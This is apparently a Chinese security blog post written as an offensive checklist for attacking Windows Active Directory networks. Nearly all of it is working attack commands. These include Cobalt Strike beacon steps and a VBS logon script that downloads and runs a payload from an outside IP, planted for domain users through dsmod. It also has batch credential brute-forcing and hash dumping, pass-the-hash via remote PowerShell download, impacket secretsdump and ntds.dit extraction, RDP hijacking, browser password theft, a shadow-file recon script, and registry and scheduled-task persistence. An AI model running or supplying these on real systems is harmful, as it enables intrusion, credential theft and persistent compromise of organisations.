<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
<title>
    
</title>
<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
<meta name="author" content="loecho">
<meta name="description" content="安全行业的从业人员">
<meta name="keywords" content="">
<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
<link rel="stylesheet" href="https://1oecho.github.io/styles/main.css" />
<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
    
            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
            
                <!--点击特效-->
                <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/love.min.js"></script>
                
                        <!--CDN样式-->
                        <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
                        
                            <script>
                                (function() {
                                    var bp = document.createElement('script');
                                    var curProtocol = window.location.protocol.split(':')[0];
                                    if (curProtocol === 'https') {
                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
                                    } else {
                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
                                    }
                                    var s = document.getElementsByTagName("script")[0];
                                    s.parentNode.insertBefore(bp, s);
                                })();
                            </script>
                            
</head>

<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo">
                <a href="https://1oecho.github.io">
                    
                </a>
            </div>

            <div class="menu navbar-right">
                
                    <a class="menu-item" href="https://1oecho.github.io/NoteBook">
                        Index
                    </a>
                    
                    <a class="menu-item" href="https://1oecho.github.io/tags">
                        Tags
                    </a>
                    
                    <a class="menu-item" href="https://github.com/loecho-sec">
                        Whoami
                    </a>
                    
                        <input id="switch_default" type="checkbox" class="switch_default">
                        <label for="switch_default" class="toggleBtn"></label>
            </div>
            <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
            </form>
        </div>
    </nav>

    
        <nav class="navbar-mobile" id="nav-mobile">
            <div class="container">
                <div class="navbar-header">
                    <div>
                        <a href="https://1oecho.github.io">
                            
                        </a>
                        <!--en-->
                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
                        <!--zh-->
                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
                    </div>
                    <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
                    </form>
                    <!--en-->
                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
                    <!--zh-->
                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>

                </div>
                <div class="menu" id="mobile-menu">
                    
                        <a class="menu-item" href="https://1oecho.github.io/NoteBook">
                            Index
                        </a>
                        
                        <a class="menu-item" href="https://1oecho.github.io/tags">
                            Tags
                        </a>
                        
                        <a class="menu-item" href="https://github.com/loecho-sec">
                            Whoami
                        </a>
                        
                </div>
            </div>
        </nav>
</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementById("menu-toggle-en");
        var toggleMenu_zh = document.getElementById("menu-toggle-zh");

        var mobileMenu = document.getElementById("mobile-menu");
        if (toggleMenu.display != "none") {
            if (toggleMenu.classList.contains("active")) {
                toggleMenu.classList.remove("active")
                mobileMenu.classList.remove("active")
            } else {
                toggleMenu.classList.add("active")
                mobileMenu.classList.add("active")
            }
        } else if (toggleMenu_zh.display != "none") {
            if (toggleMenu_zh.classList.contains("active")) {
                toggleMenu_zh.classList.remove("active")
                mobileMenu.classList.remove("active")
            } else {
                toggleMenu_zh.classList.add("active")
                mobileMenu.classList.add("active")
            }
        }

    }
</script>
            <div class="main">
                <div class="container">
                    <article class="post-wrap">
                        <header class="post-header">
                            <h1 class="post-title">
                                内网渗透：实战思路以及相关命令
                            </h1>
                            
                                    <!--zh-->
                                    <div class="post-meta zh">
                                        &#x4F5C;&#x8005;:
                                        <a itemprop="author" rel="author" href="/">
                                            
                                        </a>
                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2022-02-10</a></span>
                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
                                    href="#">41.6
                                    &#x5206;&#x949F;</a></span>
                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">7956</a></span>
                                        
                                                阅读量:
                                                <span data-hk-page="current"> - </span>
                                                
                                    </div>
                                    
                        </header>
                        
                        <div class="post-content">
                            <ul>
<li>来源于各位大佬，记录做checkList</li>
</ul>
<h2 id="内网渗透基本流程图">内网渗透基本流程图：</h2>
<p><a href="https://xmind.net/m/5dypm8/#" title="AD域渗透思维导图">AD域渗透思维导图</a></p>
<figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/202201041327283.png" alt="" loading="lazy"></figure>
<h2 id="域渗透-0~09">域渗透 0~0.9：</h2>
<p><a href="https://zer1t0.gitlab.io/posts/attacking_ad/">AD域渗透流程</a></p>
<figure data-type="image" tabindex="2"><img src="http://showdoc.wiki.com.qax/server/index.php?s=/api/attachment/visitFile&amp;sign=7379917cdc7c50482f18070eb87540ac" alt="" loading="lazy"></figure>
<p>[TOC]</p>
<h2 id="获取域控权限后定点打击运维">获取域控权限后，定点打击运维：</h2>
<pre><code>
至于如何导出 windows 日志,系统其实已经自带了一个非常好用的日志管理工具 即 wevtutil,下面这句话的意思就是把日志 id 为 4624[即登录成功的日志,大部分情况下我们只需要登录成功的]的日志在 4449183132[指定的时间换
算成对应的时间戳]这个时间以内的所有日志都导到指定目录下的 risalogs.evtx 文件中,然后再想办法把这个文件拖到本地来分析

# 域控导出日志：

beacon&gt; shell hostname
beacon&gt; shell wevtutil epl Security c:\windows\logs\risalogs.evtx /q:&quot;*[EventData[Data[@Name='LogonType']='3'] and System[(EventID=4624) and TimeCreated[timediff(@SystemTime) &lt;= 4449183132]]]&quot;
beacon&gt; shell tasklist | findstr &quot;wevtutil.exe&quot;
beacon&gt; shell dir c:\windows\logs\risalogs.evtx
beacon&gt; download c:\windows\logs\risalogs.evtx
beacon&gt; downloads

# 本地日志筛洗:

LogParser.exe -i:EVT -o csv &quot;SELECT TO_UPPERCASE(EXTRACT_TOKEN(Strings,5,'|')) as NAME,TO_UPPERCASE(EXTRACT_TOKEN(Strings,18,'|')) as IP FROM c:\risalogs.evtx&quot; &gt; C:\log.txt

# 筛选日志：

# grep -v '\$' log.txt | sort | uniq | egrep -v 'ANONYMOUS LOGON|-|:' &gt; login_succeed.txt
# head -n 25 login_succeed.txt
# wc -l login_succeed.txt

例子：loecho 为例：

# grep 'loecho' login_succeed.txt # 筛选出登录IP

# 横向到指定机器-方法1：

beacon&gt; shell net use \\WIN-HK0SO5MHHQ6\c$ /user:&quot;study\Administrator&quot; &quot;hello.!@#45&quot;
beacon&gt; shell copy c:\windows\logs\dpx\cvsrds.exe \\WIN-HK0SO5MHHQ6\admin$\help\help\
beacon&gt; shell dir \\WIN-HK0SO5MHHQ6\admin$\help\help\
beacon&gt; shell wmiexec.exe study/Administrator:hello.!@#45@WIN-HK0SO5MHHQ6 &quot;c:\windows\help\help\cvsrds.exe&quot;
beacon&gt; rm wmiexec.exe
beacon&gt; rm cvsrds.exe
beacon&gt; shell net use * /del /yes


# 横向到指定机器-方法2:

首先,想办法将目标主控机器的 beacon shell 弹回来,之后查看到当前域组策略脚本目录,即 NETLOGON 所对应的路径,等会儿的 vbs payload 就是要上传这个目录下,这样当目标下次重启登录时候就会自动加载执行里面的脚本

beacon&gt; shell net time /domain 如何确定主控,在之前也有提过,net time 即可看到
beacon&gt; shell hostname
beacon&gt; shell net share # NETLOGIN脚本目录，上传上线vbs


trFileURL = &quot;http://21.65.87.33:80/cvsrds.exe&quot;
strHDLocation = &quot;c:\windows\temp\cvsrds.exe&quot;
Set objXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;)
objXMLHTTP.open &quot;GET&quot;, strFileURL, false
objXMLHTTP.send()
If objXMLHTTP.Status = 200 Then
Set objADOStream = CreateObject(&quot;ADODB.Stream&quot;)
objADOStream.Open
objADOStream.Type = 1 'adTypeBinary
objADOStream.Write objXMLHTTP.ResponseBody
objADOStream.Position = 0'Set the stream position to the start
Set objFSO = Createobject(&quot;Scripting.FileSystemObject&quot;)
If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
Set objFSO = Nothing
objADOStream.SaveToFile strHDLocation
objADOStream.Close
Set objADOStream = Nothing
End if
Set objXMLHTTP = Nothing
strComputer = &quot;.&quot;
set ws=wscript.createobject(&quot;wscript.shell&quot;)
val=ws.run (&quot;c:\windows\temp\cvsrds.exe&quot;,0

# 如下是最关键的一步,利用 dsmod 修改指定的目标域用户属性,即 给用户添加我们刚刚准备好的登录脚本,具体如下

beacon&gt; shell dsquery user | findstr &quot;boss&quot;
beacon&gt; shell dsmod user -loscr &quot;info.vbs&quot; &quot;CN=boss,CN=Users,DC=god,DC=org&quot;
beacon&gt; shell gpupdate /force


# 一点扩展用法 [ 通过批处理,借助 dsmod,对指定的多个用户批量添加登录脚本,实现域内批量上线,当然啦,实际中并不建议一次种太多,建议有针对性的种 ]

# for /f %i in (user.txt) do dsmod user -loscr &quot;info.vbs&quot; &quot;CN=%i,CN=Users,DC=god,DC=org&quot;
# type user.txt

# 务必记得等所有目标机器都稳定上线之后,立即去把对应的登录脚本都删掉
</code></pre>
<h2 id="批量wmi-无依赖横向445爆破">批量WMI 无依赖横向(445爆破)：</h2>
<pre><code># for /f %i in (host.txt) do net use \\%i\admin$ /user:&quot;administrator&quot; &quot;Admin12345&quot; &amp;&amp; if %errorlevel% equ 0 ( echo %i &gt;&gt; c:\windows\temp\login_succeed.txt ) &amp;&amp; net use \\%i\admin$ /del
</code></pre>
<h2 id="批量445抓hash">批量445抓Hash:</h2>
<pre><code># for /f %i in (host.txt) do psexec \\%i -accepteula -u administrator -p Admin12345 -c C:\Tools\QuarksPwDump.exe -dhl -o C:\windows\temp\%i.txt &amp;&amp; move /y \\%i\admin$\temp\%i.txt c:\windows\temp\
</code></pre>
<h2 id="批量无依赖pth">批量无依赖PTH:</h2>
<pre><code># powershell -exec bypass
PS &gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-TheHash.ps1');
PS &gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1');
PS &gt; Invoke-TheHash -Type WMIExec -Target 192.168.3.0/24 -Domain . -Username administrator -Hash ccef208c6485269c20db2cad21734fe7
</code></pre>
<h2 id="批量上线cs">批量上线CS：</h2>
<pre><code>for /f %i in (host.txt) do net use \\%i\admin$ /user:&quot;administrator&quot; &quot;Admin12345&quot; &amp;&amp; copy C:\Tools\beacon.exe \\%i\admin$\temp\ &amp;&amp; wmic /node:%i /user:administrator /password:Admin12345 PROCESS call create 
&quot;\\%i\admin$\temp\beacon.exe&quot; &amp;&amp; net use \\%i\admin$ /del
</code></pre>
<h2 id="impaket-利用手册">impaket 利用手册</h2>
<pre><code>0x01 Wmi

以明文密码或 pth 形式远程非交互命令执行
# python3 wmiexec.py ./administrator:'admin!@#45'@172.23.119.106 &quot;quser&quot; -codec gbk
# python3 wmiexec.py -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.91 'quser' -codec gbk

远程非交互执行 Cmd 或 PS 命令
# python3 wmiexec.py -shell-type cmd ./administrator:'admin!@#45'@172.23.119.81 &quot;quser&quot; -codec gbk
# python3 wmiexec.py -shell-type powershell -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.81 'get-host' -codec gbk

Cmd 或 PS, 远程交互式 shell
# python3 wmiexec.py -shell-type cmd ./administrator:'abc123!@#45'@172.23.119.109 -codec gbk
# python3 wmiexec.py -shell-type powershell -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.109 -codec gbk

加上执行时间标识, 输出详细调试信息(便于后续排查问题),[ 注,默认管道名易被杀软识别 ]
# python3 wmiexec.py -ts -debug ./administrator:'Admin12345'@172.23.119.86 &quot;quser&quot; -codec gbk
# python3 wmiexec.py -ts -debug -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.119 'net group &quot;domain admins&quot; /domain' -codec gbk

只执行命令,不获取命令结果, 走的单端口,避免由于 445 端口不通而导致整个执行失败
# python3 wmiexec.py -nooutput ./administrator:'abc123!@#45'@172.23.119.82 &quot;quser &gt; C:\Users\Public\Documents\logs.txt&quot; -codec gbk
# python3 wmiexec.py -nooutput -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.82 'tasklist&gt; C:\Users\Public\Documents\logs.txt' -codec gbk

0x02 Dcom

远程非交互命令执行,支持 ShellWindows, ShellBrowserWindow, MMC20 方法
# python3 dcomexec.py -ts -debug -object MMC20 ./administrator:'admin!@#45'@172.23.119.91 &quot;quser&quot; -codec gbk
# python3 dcomexec.py -ts -debug -hashes :9e62b88124f1d8f8025164799510bc7f -object MMC20 klion/sysadm:@172.23.119.91 &quot;quser&quot; -codec gbk

Dcom 远程交互 shell
# python3 dcomexec.py -ts -debug -object MMC20 ./administrator:'admin!@#45'@172.23.119.91 -codec gbk
# python3 dcomexec.py -ts -debug -hashes :9e62b88124f1d8f8025164799510bc7f -shell-type powershell -object MMC20 klion/sysadm:@172.23.119.91 -codec gbk 极易被拦截

0x03 计划任务
远程非交互命令执行, 默认 System 权限
# python3 atexec.py -ts -debug -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.91 &quot;quser&quot; -codec gbk
# python3 atexec.py -ts -debug ./administrator:'admin!@#45'@172.23.119.91 'dir c:\' -codec gbk

0x04 Smb
远程交互 shell, 默认 system 权限
# python3 smbexec.py -ts -debug -hashes :518B98AD4178A53695DC997AA02D455C ./administrator@172.23.119.81 -codec gbk
# python3 smbexec.py -ts -debug klion/sysadm:'admin!@#45'@172.23.119.81 -codec gbk
# python3 psexec.py -ts -debug -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.51 'net group &quot;domain admins&quot; /domain'
# python3 psexec.py -ts -debug ./administrator:'admin!@#45'@172.23.119.106 'net group &quot;domain admins&quot; /domain'
# python3 psexec.py -ts -debug ./administrator:'admin!@#45'@172.23.119.106 'net group &quot;domain controllers&quot; /domain'

0x05 远程抓 hash
抓本地 hash
远程在线抓 hash
# python3 secretsdump.py -hashes :518B98AD4178A53695DC997AA02D455C ./administrator@172.23.119.51 -outputfile 172.23.119.51.hash.txt

本地离线解 hash

# python3 wmiexec.py -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.51 -codec gbk
# cd c:\users\public\documents
# reg save HKLM\SYSTEM sys.hiv
# reg save HKLM\SAM sam.hiv
# reg save hklm\security security.hiv
# lget sys.hiv
# lget security.hiv
# lget sam.hiv
# python3 secretsdump.py -sam sam.hiv -security security.hiv -system sys.hiv LOCAL -outputfile 6.Hash.txt

导 ntds.dit
远程在线导 ntds.dit
# python3 secretsdump.py -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.120 -outputfile klion.local.ntds.txt
# python3 secretsdump.py klion/administrator:'Admin12345'@172.23.119.120 -outputfile klion.local.ntds.txt

本地离线解 ntds.dit
# python3 wmiexec.py -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.120 -codec gbk
# cd c:\users\public\documents
# vssadmin list shadows
# vssadmin create shadow /for=c:
# copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\users\public\documents\ntds.dit /Y
# vssadmin delete shadows /for=c: /quiet
# reg save hklm\system system.hiv
# lput gosecretsdump.exe
# gosecretsdump.exe -history -ntds ntds.dit -system system.hiv -out klion.local.txt 目标机上解
# python3 secretsdump.py -system system.hiv -ntds ntds.dit LOCAL -outputfile klion.ntds.dit 拖回来本地解

0x06 域外利用相关
# python3 GetUserSPNs.py klion.local/WenYa.xue:'xwy123!@#45' -dc-ip 172.23.119.120 -request Kerberoasting 利用
# python3 GetNPUsers.py klion.local/sysadm:'sys123!@#45' -dc-ip 172.23.119.120 -request AS-REPRoasting 利用
# python3 GetADUsers.py klion.local/sysadm:'sys123!@#45' -dc-ip 172.23.119.120 -all 抓取目标域内用户列表
# python3 findDelegation.py klion.local/sysadm:'sys123!@#45' -dc-ip 172.23.119.120 查询目标域内委派
# python3 lookupsid.py -ts ./administrator:'admin!@#45'@172.23.119.120 枚举目标系统用户列表(RPC)
# python3 netview.py -debug klion.local/sysadm:'sys123!@#45' -dc-ip 172.23.119.120 批量获取域内存活主机的用户登录记录
# python3 getTGT.py -debug klion.local/sysadm:'sys123!@#45' -dc-ip 172.23.119.120 获取指定域用户票据
# python3 getArch.py -target 192.168.159.11 查看目标系统位数
# python3 rpcdump.py ./administrator:'admin!@#45'@172.23.119.120 远程 Dump RPC 数据

0x07 远程提取目标 Exchange 邮箱信息
# python3 exchanger.py -rpc-hostname Ex2010SP3 klion/its:'admin!@#45'@192.168.159.12 nspi list-tables
# python3 exchanger.py -rpc-hostname Ex2010SP3 klion/its:'admin!@#45'@192.168.159.12 nspi dump-tables -guid 57f0c459-519c-47f8-9e1b-f83a1f8a51a8
</code></pre>
<h2 id="guest用户劫持administere-rdp">GUEST用户劫持Administere-RDP</h2>
<pre><code>登录guest用户，使用rdp劫持登录administrator。

query user

sc create tide binpath= &quot;cmd.exe /k tscon 1 /dest:rdp-tcp#4&quot;      #1为目标会话id和当前会话名

net start tide
</code></pre>
<h2 id="浏览器相关">浏览器相关：</h2>
<pre><code>1. 浏览器下载记录
2. 浏览器历史记录
3. 浏览器保存的账号密码
4. 浏览器收藏夹标签

# Github项目
https://github.com/GhostPack/Seatbelt # 爬取浏览器收藏夹等机器其他敏感资产

https://github.com/moonD4rk/HackBrowserData # hackbrowserdata 是一个解密浏览器数据（密码|历史记录|Cookies|书签）的导出工具，支持全平台主流浏览器

https://github.com/AlessandroZ/LaZagne #  LaZagne项目是用于开源应用程序获取大量的密码存储在本地计算机上

https://github.com/uknowsec/SharpDecryptPwd # 解密常用软件密码，例如navcat,wincap等
</code></pre>
<h2 id="最近打开文件">最近打开文件：</h2>
<pre><code>C:\Users[User]\AppData\Roaming\Microsoft\Windows\Recent
</code></pre>
<h2 id="防火墙配置">防火墙配置</h2>
<pre><code>netsh advfirewall show allprofiles
</code></pre>
<h2 id="rdp连接记录">RDP连接记录</h2>
<pre><code>cmdkey /list

reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\servers&quot;

reg query &quot;HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVER CLIENT\DEFAULT&quot;

</code></pre>
<h2 id="启动项查询">启动项查询</h2>
<pre><code>wmic startup get command,caption

REG QUERY HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
</code></pre>
<h2 id="服务信息">服务信息</h2>
<pre><code>wmic service list brief

查看是否开启DHCP或其他第三方服务
</code></pre>
<h2 id="已安装程序">已安装程序</h2>
<pre><code>wmic product get name,version

rty name,version

powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version

</code></pre>
<h1 id="敏感文件">敏感文件：</h1>
<pre><code class="language-cmd"># Windows:

findstr /si password  config.*  *.ini *.txt *.properties

dir /a /s /b d:\&quot;*.txt&quot;
dir /a /s /b d:\&quot;*.xml&quot;
dir /a /s /b d:\&quot;*.mdb&quot;
dir /a /s /b d:\&quot;*.sql&quot;
dir /a /s /b d:\&quot;*.mdf&quot;
dir /a /s /b d:\&quot;*.eml&quot;
dir /a /s /b d:\&quot;*.pst&quot;
dir /a /s /b d:\&quot;*conf*&quot;
dir /a /s /b d:\&quot;*bak*&quot;
dir /a /s /b d:\&quot;*pwd*&quot;
dir /a /s /b d:\&quot;*pass*&quot;
dir /a /s /b d:\&quot;*login*&quot;
dir /a /s /b d:\&quot;*user*&quot;

# Linux 
find / -name *.properties
grep -r &quot;查询内容&quot;  文件目录


#!/bin/bash
# by forum.ywhack.com

#输出文件
filename=$(date +%s)'.log'

echo &quot;信息收集&quot;
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;账户信息收集&quot; | tee -a $filename
cat /etc/passwd | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;shadow&quot; | tee -a $filename
cat /etc/shadow | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;进程信息收集&quot; | tee -a $filename
ps aux | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;网络连接&quot; | tee -a $filename
netstat -antlp | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;当前用户:&quot; $(whoami) 2&gt;/dev/null | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;端口监听&quot; | tee -a $filename
netstat -lnpt | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;可登陆用户&quot; | tee -a $filename
cat /etc/passwd | grep -E -v 'nologin$|false' | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;增加用户的日志&quot; | tee -a $filename
grep &quot;useradd&quot; /var/log/secure  | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;History操作提取&quot; | tee -a $filename
cat ~/.*history | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;登录成功的IP&quot; | tee -a $filename
grep &quot;Accepted &quot; /var/log/secure* | awk '{print $11}' | sort | uniq -c | sort -nr | more | tee -a $filename   
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;查看路由表&quot; | tee -a $filename
route -n | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;查看 SSH key&quot; | tee -a $filename
sshkey=${HOME}/.ssh/authorized_keys
if [ -e &quot;${sshkey}&quot; ]; then
    cat ${sshkey} | tee -a $filename
else
    echo -e &quot;SSH key文件不存在\n&quot; | tee -a $filename
fi
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;查看 known_hosts&quot; | tee -a $filename
cat ~/.ssh/known_hosts | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;查找WEB-INF&quot; | tee -a $filename
find / -name *.properties 2&gt;/dev/null | grep WEB-INF | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;user|pass|pwd|uname|login|db_&quot; | tee -a $filename
find / -name &quot;*.properties&quot; | xargs egrep -i &quot;user|pass|pwd|uname|login|db_&quot; | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;jdbc:|pass=|passwd=&quot; | tee -a $filename
find / -regex &quot;.*\.properties\|.*\.conf\|.*\.config\|.*\.sh&quot; | xargs grep -E &quot;=jdbc:|pass=|passwd=&quot; | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
# Author cances
echo &quot;ip和网卡信息&quot; | tee -a $filename
ip a | awk '{print $2,$4}' | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;可登陆用户&quot; | tee -a $filename
cat /etc/passwd | grep -E -v 'sync$|halt$|nologin$|false|shutdown' | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;用户登陆日志&quot; | tee -a $filename
lastlog | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;查看 hosts&quot; | tee -a $filename
cat /etc/hosts | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;查看 系统版本&quot; | tee -a $filename
cat /etc/*-release | tee -a $filename
echo -e &quot;\n&quot; | tee -a $filename
echo &quot;查看 内核版本&quot; | tee -a $filename
uname -mrs | tee -a $filename
</code></pre>
<h1 id="简易windows网段探测">简易Windows网段探测：</h1>
<pre><code>@echo off

rem 内网存活段自动发现脚本 [Windows]

setlocal enabledelayedexpansion

for /l %%i in (0,1,255) do (
  for /l %%k in (0,1,255) do (
    ping -w 1 -n 1 10.%%i.%%k.1 | findstr &quot;TTL=&quot; &gt;nul || ping -w 1 -n 1 10.%%i.%%k.254 | findstr &quot;TTL=&quot; &gt;nul
    if !errorlevel! equ 0 (echo 10.%%i.%%k.0/24 is alive ! &gt;&gt; alive.txt ) else (echo 10.%%i.%%k.0/24 May be sleeping ! )
  )
)

for /l %%s in (16,1,31) do (
  for /l %%d in (0,1,255) do (
    ping -n 1 -w 1 172.%%s.%%d.1  | findstr &quot;TTL=&quot; &gt;nul || ping -w 1 -n 1 172.%%s.%%d.254 | findstr &quot;TTL=&quot; &gt;nul
    if !errorlevel! equ 0 (echo 172.%%s.%%d.0/24 is alive ! &gt;&gt; alive.txt ) else (echo 172.%%s.%%d.0/24 May be sleeping ! )
  )
)

for /l %%t in (0,1,255) do (
  ping -n 1 -w 1 192.168.%%t.1  | findstr &quot;TTL=&quot; &gt;nul || ping -n 1 -w 1 192.168.%%t.254 | findstr &quot;TTL=&quot; &gt;nul
  if !errorlevel! equ 0 (echo 192.168.%%t.0/24 is alive ! &gt;&gt; alive.txt ) else (echo 192.168.%%t.0/24 May be sleeping ! )
)
</code></pre>
<h1 id="基础维权-自启动">基础维权-自启动:</h1>
<pre><code>REG query &quot;HKLMSOFTWARE\Microsoft\WindowslCurrent Version\Run&quot;
REG ADD &quot;HKLMSOFTWARE\Microsoft\WindowslCurrentVersion\Run&quot;/V&quot;SysDebug&quot;/t REG_SZ/F /D&quot;c:\windows\debug\SysDebug.exe
reg delete &quot;HKLMSOFTWARE\Microsoft\WindowslCurrentVersion\Run&quot;/V&quot;SysDebug&quot;/f
</code></pre>
<h1 id="高权限计划任务">高权限计划任务:</h1>
<pre><code>schtasks /create /RL HIGHEST /F /tn &quot;SysDebug&quot; /tr &quot;c:\windows\debug\SysDebug.exe&quot;/sc DAILY /mo 1 /ST 10:05/RU SYSTEM
schtasks /query I findstr &quot;SysDebug&quot;
schtasks /run /tn &quot;SysDebug&quot;
schtasks /delete /F /tn &quot;SysDebug&quot;
schtasks /tn &quot;SysDebug&quot; /query /fo list/v
</code></pre>
<h1 id="低权限计划任务">低权限计划任务:</h1>
<pre><code>schtasks /create/F/tn&quot;SysDebug&quot;/tr&quot;D:\用户文档\sixj\ContactslSysDebug.exe&quot;/sc DAILY/mo1/ST10:05
schtasks /query I findstr &quot;SysDebug&quot;
schtasks /run /tn &quot;SysDebug&quot;
schtasks/delete/F/tn&quot;SysDebug&quot;
schtasks /tn &quot;SysDebug&quot; /query /fo list /v
</code></pre>
<h1 id="单机信息收集">单机信息收集：</h1>
<pre><code># 1. 基础的各类文件，关键字定位：

  getFile.exe all # 自研文件查找工具

# 2. 主机安装的软件，确定主机类型：

wmic OS get Caption，CSDVersion，Version，OSArchitecture


# 3. 一把soha，拖回本地分析

Seatable.exe all #

# 4. 重点关注进程中敏感软件,确认是否存在凭证

tasklist /svc | findstr &quot;*Mail*&quot;,&quot;KeePass&quot;

</code></pre>
<h1 id="ad域渗透-重中之重">AD域渗透-重中之重</h1>
<pre><code>findstr /c:&quot;userName=&quot; /c:&quot;cpassword=&quot;/si Nad\sysvol\xxxx.com\policiesl*.xml

net time/domain&amp;&amp;net view ad&amp;&amp;dir lladNETLOGON&amp;&amp;type llad\NETLOGONchapwd.cmd
</code></pre>
<h1 id="ad域渗透-域内信息收集">AD域渗透-域内信息收集:</h1>
<pre><code>powershell-import/home/xxxx/Desktop/SharpHound.ps1

powershell Invoke-BloodHound-CollectionMethod All

execate assembly BloodHound.exe
</code></pre>
<h1 id="ad域渗透-获取用户票据-凭证">AD域渗透-获取用户票据、凭证：</h1>
<pre><code># 通过vbs获取：

cscript GetUserSPN.vbs

# 通过Rubeus获取服务票据Hash，hashcat离线爆破：

Rubues.exe kerberoast

hashcat.exe -m 13100 hash.txt -a 3 -1 ?1?d?s?1?1?1?1?1?1
</code></pre>
